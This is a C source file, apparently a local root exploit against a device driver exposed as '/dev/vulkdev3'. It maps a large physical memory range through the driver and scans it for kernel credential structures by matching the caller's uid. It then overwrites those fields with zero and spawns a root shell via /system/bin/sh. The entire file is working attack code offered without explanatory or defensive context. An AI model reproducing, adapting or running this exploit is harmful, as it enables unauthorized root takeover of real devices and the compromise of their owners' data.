#include <stdlib.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

#define VULKDEV_DEVICE "/dev/vulkdev3"

int main(int argc, char* argv[])
{
	int fd;
	uid_t uid;
	size_t size;
	unsigned int *addr;
	unsigned long start;
	off_t offset;

	fd = open(VULKDEV_DEVICE, O_RDWR);
	if (fd < 0) {
		printf("open vulkdev fail!\n");
		exit(1);
	}

	size = 0x15400000;
	start = 0x42424000;
	offset = 0x40000000;
	addr = (unsigned int *)mmap((void *)start, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, offset);
	if (addr == MAP_FAILED) {
		printf("mmap failed, errno = %d\n", errno);
		close(fd);
		return -1;
	}
	printf("mmap addr: %lx\n", (unsigned long)addr);
	uid = getuid();
	printf("uid = %d\n", uid);

	unsigned int num = 0;
	while ((unsigned long)addr < start + size - 0x40) {
		unsigned int idx = 0;
		if (addr[idx++] == uid &&
			addr[idx++] == uid &&
			addr[idx++] == uid &&
			addr[idx++] == uid &&
			addr[idx++] == uid &&
			addr[idx++] == uid &&
			addr[idx++] == uid &&
			addr[idx++] == uid) {
			printf("find cred structure, ptr=%p, num=%d\n", addr, ++num);

			idx = 0;
			addr[idx++] = 0;
			addr[idx++] = 0;
			addr[idx++] = 0;
			addr[idx++] = 0;
			addr[idx++] = 0;
			addr[idx++] = 0;
			addr[idx++] = 0;
			addr[idx++] = 0;
			
			if (getuid() == 0) {
				printf("GOT ROOT!\n");
				break;
			} else {
				idx = 0;
				addr[idx++] = uid;
				addr[idx++] = uid;
				addr[idx++] = uid;
				addr[idx++] = uid;
				addr[idx++] = uid;
				addr[idx++] = uid;
				addr[idx++] = uid;
				addr[idx++] = uid;
			}
		}
		addr++;
	}
	printf("loop end\n");
	if (getuid() == 0)
		execl("/system/bin/sh", "sh", NULL);
	return 0;
}

